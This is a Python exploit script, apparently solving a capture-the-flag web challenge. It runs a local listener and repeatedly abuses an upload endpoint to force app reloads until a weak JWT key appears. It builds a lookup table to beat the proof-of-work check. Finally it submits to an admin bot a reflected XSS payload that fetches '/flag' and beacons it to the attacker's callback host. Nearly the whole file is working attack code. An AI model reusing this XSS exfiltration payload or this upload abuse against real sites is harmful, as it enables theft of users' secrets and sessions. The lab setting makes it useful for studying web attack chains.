#!/usr/bin/env python3
import argparse
import http.server
import json
import socketserver
import sys
import threading
import time
import urllib.parse

import gmpy2
import numpy as np
import requests


E = 677676677
BITS = 36
MASK = (1 << BITS) - 1
TABLE_BITS = 24
TABLE_SIZE = 1 << TABLE_BITS


class FlagHandler(http.server.BaseHTTPRequestHandler):
    flag = None

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)
        if "f" in qs:
            FlagHandler.flag = qs["f"][0]
            print(f"[+] exfil: {FlagHandler.flag}", flush=True)
        self.send_response(204)
        self.end_headers()

    def log_message(self, fmt, *args):
        print(f"[listener] {self.address_string()} {fmt % args}", flush=True)


def start_listener(host, port):
    srv = socketserver.TCPServer(("0.0.0.0", port), FlagHandler)
    thread = threading.Thread(target=srv.serve_forever, daemon=True)
    thread.start()
    print(f"[*] listener: http://{host}:{port}/", flush=True)
    return srv


def get_pow_n(base):
    r = requests.get(f"{base}/public.json", timeout=5)
    r.raise_for_status()
    return int(r.json()["pow"]["n"])


def touch_app(base):
    files = {"file": ("x.jpg", b"\xff\xd8\xfftouch", "image/jpeg")}
    requests.post(f"{base}/upload?t=app.py", files=files, timeout=5)


def wait_reload(base, old_n):
    deadline = time.time() + 10
    while time.time() < deadline:
        try:
            new_n = get_pow_n(base)
            if new_n != old_n:
                return new_n
        except requests.RequestException:
            pass
        time.sleep(0.25)
    raise TimeoutError("service did not reload")


def token_is_bad(base):
    r = requests.get(f"{base}/login", params={"text": "probe"}, allow_redirects=False, timeout=5)
    r.raise_for_status()
    token = r.headers["X-Token"]
    v = requests.get(f"{base}/verify_token", params={"token": token}, timeout=5)
    v.raise_for_status()
    return v.text.strip() != "OK"


def land_bad_jwt_key(base, max_reloads):
    n = get_pow_n(base)
    for i in range(1, max_reloads + 1):
        touch_app(base)
        n = wait_reload(base, n)
        if token_is_bad(base):
            print(f"[+] bad JWT key after {i} reloads", flush=True)
            return n
        if i == 1 or i % 25 == 0:
            print(f"[*] reloads tried: {i}", flush=True)
    raise RuntimeError(f"no bad JWT key after {max_reloads} reloads")


def build_pow_table(n):
    print(f"[*] building 2^{TABLE_BITS} PoW table", flush=True)
    vals = np.empty(TABLE_SIZE, dtype=np.uint64)
    started = time.time()
    for m in range(TABLE_SIZE):
        vals[m] = int(gmpy2.powmod(m, E, n)) & MASK
        if m and m % (1 << 20) == 0:
            rate = m / (time.time() - started)
            print(f"[*] table: {m >> 20}/16 Mi entries, {rate:,.0f}/s", flush=True)
    order = np.argsort(vals, kind="quicksort")
    sorted_vals = vals[order]
    print("[+] PoW table ready", flush=True)
    return sorted_vals, order


def find_pow_hit(base, sorted_vals, order, max_tries):
    for i in range(1, max_tries + 1):
        sess = requests.Session()
        r = sess.get(f"{base}/pow", timeout=5)
        r.raise_for_status()
        info = r.json()
        challenge = int(info["challenge"])
        pos = int(np.searchsorted(sorted_vals, challenge))
        if pos < len(sorted_vals) and int(sorted_vals[pos]) == challenge:
            m = int(order[pos])
            print(f"[+] PoW hit after {i} challenges: m={m}", flush=True)
            return sess, m
        if i == 1 or i % 250 == 0:
            print(f"[*] PoW challenges tried: {i}", flush=True)
    raise RuntimeError(f"no PoW hit after {max_tries} challenges")


def submit_bot(base, sess, m, target):
    r = sess.post(f"{base}/bot", data={"url": target, "m": str(m)}, timeout=20)
    print(f"[*] bot response: {r.status_code} {r.text.strip()}", flush=True)
    r.raise_for_status()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://172.21.0.2:5000")
    ap.add_argument("--bot-origin", default="http://127.0.0.1:5000")
    ap.add_argument("--callback-host", default="172.21.0.1")
    ap.add_argument("--callback-port", type=int, default=8000)
    ap.add_argument("--max-reloads", type=int, default=2000)
    ap.add_argument("--max-pow-tries", type=int, default=8000)
    args = ap.parse_args()

    base = args.base.rstrip("/")
    bot_origin = args.bot_origin.rstrip("/")
    listener = start_listener(args.callback_host, args.callback_port)
    try:
        pow_n = land_bad_jwt_key(base, args.max_reloads)
        sorted_vals, order = build_pow_table(pow_n)
        sess, m = find_pow_hit(base, sorted_vals, order, args.max_pow_tries)

        callback = f"http://{args.callback_host}:{args.callback_port}/?f="
        js = (
            "<script>fetch('/flag').then(r=>r.text()).then(f=>"
            "{new Image().src='" + callback + "'+encodeURIComponent(f)})</script>"
        )
        target = f"{bot_origin}/login?text={urllib.parse.quote(js, safe='')}"
        print(f"[*] target: {target}", flush=True)
        submit_bot(base, sess, m, target)

        deadline = time.time() + 15
        while time.time() < deadline and FlagHandler.flag is None:
            time.sleep(0.25)
        if FlagHandler.flag is None:
            print("[-] no flag received", flush=True)
            return 1
        print(FlagHandler.flag)
        return 0
    finally:
        listener.shutdown()


if __name__ == "__main__":
    sys.exit(main())
